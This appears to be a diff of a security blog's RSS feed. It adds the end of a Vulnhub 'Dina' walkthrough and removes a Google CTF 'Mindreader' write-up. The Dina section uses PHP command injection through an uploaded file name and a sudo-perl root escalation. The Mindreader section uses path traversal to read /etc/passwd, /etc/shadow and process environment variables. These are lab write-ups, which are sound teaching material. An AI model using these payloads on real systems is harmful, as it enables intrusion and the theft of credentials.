+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://10.0.2.5/SecreTSMSgatwayLogin/index.php?app=main&amp;amp;inc=feature_sendfromfile&amp;amp;op=list&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In order to run commands, we have to create a file with &lt;strong&gt;php&lt;/strong&gt; command in title, just like this example.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;touch &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system('uname -a'); dia();?&amp;gt;.php&quot;&lt;/span&gt;
+Uploaded file: Linux Dina 3.2.0-23-generic-pae &lt;span class=&quot;c&quot;&gt;#36-Ubuntu SMP Tue Apr 10 22:19:09 UTC 2012 i686 i686 i386 GNU/Linux&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;It’s working! But there’s one problem - names of our files cannot contain &lt;strong&gt;/&lt;/strong&gt; characters, as they’re restriced by the filesystem. One workaround would be to encode the command with &lt;strong&gt;base64&lt;/strong&gt; and then decode the string through php function.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;cat /etc/passwd&quot;&lt;/span&gt; | base64
+&lt;span class=&quot;nv&quot;&gt;Y2F0IC9ldGMvcGFzc3dkCg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;
+touch &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;?php system(base64_decode('Y2F0IC9ldGMvcGFzc3dkCg==')); dia();?&amp;gt;.php&quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Will it work?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+messagebus:x:102:105::/var/run/dbus:/bin/false
+colord:x:103:108:colord colour management daemon,,,:/var/lib/colord:/bin/false
+lightdm:x:104:111:Light Display Manager:/var/lib/lightdm:/bin/false
+whoopsie:x:105:114::/nonexistent:/bin/false
+avahi-autoipd:x:106:117:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+avahi:x:107:118:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+usbmux:x:108:46:usbmux daemon,,,:/home/usbmux:/bin/false
+kernoops:x:109:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+pulse:x:110:119:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+rtkit:x:111:122:RealtimeKit,,,:/proc:/bin/false
+speech-dispatcher:x:112:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+hplip:x:113:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+saned:x:114:123::/home/saned:/bin/false
+touhid:x:1000:1000:touhid,,,:/home/touhid:/bin/bash
+mysql:x:115:125:MySQL Server,,,:/nonexistent:/bin/false&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Yes! Now we have to find a way to get to the flag. From numerous times, I remember to start from easiest things, which is checking &lt;strong&gt;sudo -l&lt;/strong&gt; command.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Uploaded file: Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data on this host:
+    env_reset,
+    &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin
+
+User www-data may run the following commands on this host:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/perl&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Hmm, we can run &lt;strong&gt;perl&lt;/strong&gt; commands with root permissions. Let’s try to use it and read the contents of the flag.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;sudo perl-e 'exec(&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cat /root/flag.txt&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;)'&quot;&lt;/span&gt; | base64
+&lt;span class=&quot;nv&quot;&gt;c3VkbyBwZXJsLWUgJ2V4ZWMoImNhdCAvcm9vdC9mbGFnLnR4dCIpJwo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now it’s time to upload it.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&amp;lt;?php system&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;base64_decode&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'c3VkbyBwZXJsIC1lICdleGVjKCJjYXQgL3Jvb3QvZmxhZy50eHQiKScK'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; dia&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;?&amp;gt;.php
+Uploaded file: ________                                                _________
+&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_______&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-------___&lt;/span&gt;       ___         ____----------/_________/
+    &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;______&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\\\&lt;/span&gt;   //_ _ &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;    //////-------/________/
+        &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_____&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt; ~|~ &lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;//------/________/
+            &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;____&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; / &lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt; //----/_____/
+                 &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;-&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;_&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;/____/
+                       &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_/  &lt;span class=&quot;o&quot;&gt;(((&lt;/span&gt;     &lt;span class=&quot;o&quot;&gt;(((&lt;/span&gt;_/
+                          |  -&lt;span class=&quot;o&quot;&gt;)))&lt;/span&gt;  -  &lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+
+
+root password is : hello@3210
+easy one .....but hard to guess.....
+but i think u dont need root password......
+u already have root shelll....
+
+
+CONGO.........
+FLAG : 22d06624cd604a0626eb5a2992a6f2e6&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Our goal was to get the flag, so the job is done here, but reverse shell would be very easy to implement from this step.&lt;/p&gt;
+</description>
+        <pubDate>Sat, 18 Nov 2017 08:00:00 +0000</pubDate>
+        <link>http://localhost:4000/vulnhub-dina/</link>
+        <guid isPermaLink="true">http://localhost:4000/vulnhub-dina/</guid>
+      </item>
+    
+      <item>
         <title>Vulnhub.com - Rickdiculously Easy 1</title>
         <description>&lt;p&gt;With some time between lectures, I decided to try out some new machines from Vulnhub - in particular the one called &lt;strong&gt;RickdiculouslyEasy&lt;/strong&gt; as it seems to be really fun.&lt;/p&gt;
 
@@ -936,7 +1311,7 @@ _______________________________________________________________
 
 &lt;p&gt;&lt;img src=&quot;/img/quaoar/wp-admin.png&quot; alt=&quot;Admin login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
 
-&lt;p&gt;And there's even more, username of this account is simply &lt;b&gt;admin&lt;/b&gt;! Now we're in the administrator panel of Wordpress, from where we can deploy a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;. &lt;/p&gt;
+&lt;p&gt;And there's even more, password of this account is simply &lt;b&gt;admin&lt;/b&gt;! Now we're in the administrator panel of Wordpress, from where we can deploy a &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;PHP Reverse Shell&lt;/a&gt;. &lt;/p&gt;
 
 &lt;p&gt;Reemeber to change the IP address. &lt;/p&gt;
 
@@ -3381,218 +3756,6 @@ P.S. I'll show/explain the solution on the stream next week.
         <pubDate>Thu, 22 Jun 2017 08:00:00 +0000</pubDate>
         <link>http://localhost:4000/gynvael-mission-6/</link>
         <guid isPermaLink="true">http://localhost:4000/gynvael-mission-6/</guid>
-      </item>
-    
-      <item>
-        <title>GoogleCTF - Mindreader</title>
-        <description>&lt;p&gt;GoogleCTF from this year was hard. I couldn't solve most of the challenges, the ones that I made took me a lot of time to finish. But that's why we're here, to learn from a good challenge and from mistakes made during attacks. That's why I'm looking forward to write ups for other challenges and I'm publishing ones for the challenges, that I have finished. Let's start from the one with biggest number of solves - mindreader. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Can you read my mind?
-
-Challenge running at https://mindreader.web.ctfcompetition.com/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Quite descriptive, right?&lt;/p&gt;
-
-&lt;h1&gt;Mindreader - Easy&lt;/h1&gt;
-
-&lt;p&gt;Viewing the page provided in the challenge gives us a little input box. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Hello, what do you want to read?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;GET&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;f&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Read&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
-    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Very simple, nothing hidden in the code, no external files so let's focus on the input. Entering some words, phrases in it doesn't seem to work - we always get redirected to the &lt;b&gt;Not Found&lt;/b&gt; page. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=flag
-
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;404 Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Not Found&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Can it be a hint? Maybe the code is looking for a file in the server named just as in our input. If that's the case and code is not properly implemented, it can be vulnerable to &lt;b&gt;local file intrusion&lt;/b&gt; attack. &lt;/p&gt;
-
-&lt;p&gt;&lt;b&gt;LFI&lt;/b&gt; occurs, when programmer does not correctly sanitaze the page include, which allows an attack to inject directory traversal characters and get system information essential to further exploit the server. Here you can see an example of such &lt;b&gt;bad code&lt;/b&gt;. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
- &lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'f'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
- &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
- &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-     &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
- &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
- &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
- &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
-     &lt;span class=&quot;k&quot;&gt;include&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;index.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
- &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As we now know the basics, let's try to get some files using this attack and see if it works. First one - &lt;b&gt;/etc/passwd&lt;/b&gt;. To get this working you have to enter ../../../../etc/passwd path in the input box, click submit and webpage will redirect you to the file. That's how we'll be trying to access this and other resources.  &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fpasswd
-
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Great, we got it! But what can we do with it, there's no flag here so we have to keep looking further. I came with idea to grab &lt;b&gt;/etc/shadow&lt;/b&gt; and then crack the passwords. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fshadow
-
-root:*:17324:0:99999:7:::
-daemon:*:17324:0:99999:7:::
-bin:*:17324:0:99999:7:::
-sys:*:17324:0:99999:7:::
-sync:*:17324:0:99999:7:::
-games:*:17324:0:99999:7:::
-man:*:17324:0:99999:7:::
-lp:*:17324:0:99999:7:::
-mail:*:17324:0:99999:7:::
-news:*:17324:0:99999:7:::
-uucp:*:17324:0:99999:7:::
-proxy:*:17324:0:99999:7:::
-www-data:*:17324:0:99999:7:::
-backup:*:17324:0:99999:7:::
-list:*:17324:0:99999:7:::
-irc:*:17324:0:99999:7:::
-gnats:*:17324:0:99999:7:::
-nobody:*:17324:0:99999:7:::
-systemd-timesync:*:17324:0:99999:7:::
-systemd-network:*:17324:0:99999:7:::
-systemd-resolve:*:17324:0:99999:7:::
-systemd-bus-proxy:*:17324:0:99999:7:::&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;But this didn't work out. We have to keep looking further, maybe in the &lt;b&gt;.bashrc&lt;/b&gt;? Any clues? &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fetc%2Fbash.bashrc
-
-# System-wide .bashrc file for interactive bash(1) shells.
-
-# To enable the settings / commands in this file for login shells as well,
-# this file has to be sourced in /etc/profile.
-
-# If not running interactively, don't do anything
-[ -z &quot;$PS1&quot; ] &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; return
-
-# check the window size after each command and, if necessary,
-# update the values of LINES and COLUMNS.
-shopt -s checkwinsize
-
-# set variable identifying the chroot you work in (used in the prompt below)
-if [ -z &quot;${debian_chroot:-}&quot; ] &lt;span class=&quot;err&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; [ -r /etc/debian_chroot ]; then
-    debian_chroot=$(cat /etc/debian_chroot)
-fi
-
-# set a fancy prompt (non-color, overwrite the one in /etc/profile)
-PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
-
-# Commented out, don't overwrite xterm -T &quot;title&quot; -n &quot;icontitle&quot; by default.
-# If this is an xterm set the title to user@host:dir
-#case &quot;$TERM&quot; in
-#xterm*|rxvt*)
-#    PROMPT_COMMAND='echo -ne &quot;\033]0;${USER}@${HOSTNAME}: ${PWD}\007&quot;'
-#    ;;
-#*)
-#    ;;
-#esac
-
-# enable bash completion in interactive shells
-#if ! shopt -oq posix; then
-#  if [ -f /usr/share/bash-completion/bash_completion ]; then
-#    . /usr/share/bash-completion/bash_completion
-#  elif [ -f /etc/bash_completion ]; then
-#    . /etc/bash_completion
-#  fi
-#fi
-
-# if the command-not-found package is installed, use it
-if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
-	function command_not_found_handle {
-	        # check because c-n-f could've been removed in the meantime
-                if [ -x /usr/lib/command-not-found ]; then
-		   /usr/lib/command-not-found -- &quot;$1&quot;
-                   return $?
-                elif [ -x /usr/share/command-not-found/command-not-found ]; then
-		   /usr/share/command-not-found/command-not-found -- &quot;$1&quot;
-                   return $?
-		else
-		   printf &quot;%s: command not found\n&quot; &quot;$1&quot; &amp;gt;&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;2
-		   return 127
-		fi
-	}
-fi&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Nope. When trying &lt;b&gt;proc/version&lt;/b&gt;, we get forbidden, so that's something new. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=..%2F..%2F..%2F..%2Fproc%2Fversion
-
-&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;403 Forbidden&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Forbidden&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;&amp;lt;p&amp;gt;&lt;/span&gt;You don't have the permission to access the requested resource. It is either read-protected or not readable by the server.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;Every file in &lt;b&gt;/proc&lt;/b&gt; seems to be protected. But after good (and educational!) few hours of looking, I've managed to find something in Linux man pages. Let's take a look at &lt;b&gt;/proc/[pid]/environ&lt;/b&gt;. &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;/proc/[pid]/environ
-       This file contains the initial environment that was set when
-       the currently executing program was started via execve(2).
-       The entries are separated by null bytes ('\0'), and there may
-       be a null byte at the end.  Thus, to print out the environment
-       of process 1, you would do:
-
-           $ strings /proc/1/environ
-
-       If, after an execve(2), the process modifies its environment
-       (e.g., by calling functions such as putenv(3) or modifying the
-       environ(7) variable directly), this file will not reflect
-       those changes.
-
-       Furthermore, a process may change the memory location that
-       this file refers via prctl(2) operations such as
-       PR_SET_MM_ENV_START.
-
-       Permission to access this file is governed by a ptrace access
-       mode PTRACE_MODE_READ_FSCREDS check; see ptrace(2).&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;As enviroment can be very useful, I decided that that's the path I wanna go in this challenge. But as &lt;b&gt;/proc&lt;/b&gt; is forbidden, we have to find a different way. Here comes Stackoverflow to the rescue, let's look at this &lt;a href=&quot;https://unix.stackexchange.com/questions/18255/how-does-dev-fd-relate-to-proc-self-fd&quot;&gt;&lt;b&gt;thread&lt;/b&gt;&lt;/a&gt;!&lt;/p&gt;
-
-&lt;p&gt;But trying &lt;b&gt;/dev/fd/environ&lt;/b&gt; is once again - not found. I have to be missing something. Let's rethink that - we use a symlink to get into &lt;b&gt;/proc/self/fd&lt;/b&gt;, and now we have to go back one directory and then jump to envrion. Got it! &lt;/p&gt;
-
-&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;https://mindreader.web.ctfcompetition.com/?f=%2Fdev%2Ffd%2F..%2Fenviron
-
-GAE_MEMORY_MB=614HOSTNAME=a2c5f45b98c8GAE_INSTANCE=aef-mindreader--sss6w3uqjfrcntmn-20170618t144344-8r7fPORT=8080HOME=/rootPYTHONUNBUFFERED=1GAE_SERVICE=mindreader-sss6w3uqjfrcntmnPATH=/env/bin:/opt/python3.5/bin:/opt/python3.6/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binGAE_DEPLOYMENT_ID=402060873983974243LANG=C.UTF-8DEBIAN_FRONTEND=noninteractiveGCLOUD_PROJECT=ctf-web-kuqo48dGOOGLE_CLOUD_PROJECT=ctf-web-kuqo48dCHALLENGE_NAME=mindreaderVIRTUAL_ENV=/envPWD=/home/vmagent/appGAE_VERSION=20170618t144344FLAG=CTF{ee02d9243ed6dfcf83b8d520af8502e1}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
-
-&lt;p&gt;And along with the environ, there's a hidden flag! &lt;/p&gt;
-</description>
-        <pubDate>Mon, 19 Jun 2017 08:00:00 +0000</pubDate>
-        <link>http://localhost:4000/googlectf-mindreader/</link>
-        <guid isPermaLink="true">http://localhost:4000/googlectf-mindreader/</guid>
       </item>
     
   </channel>
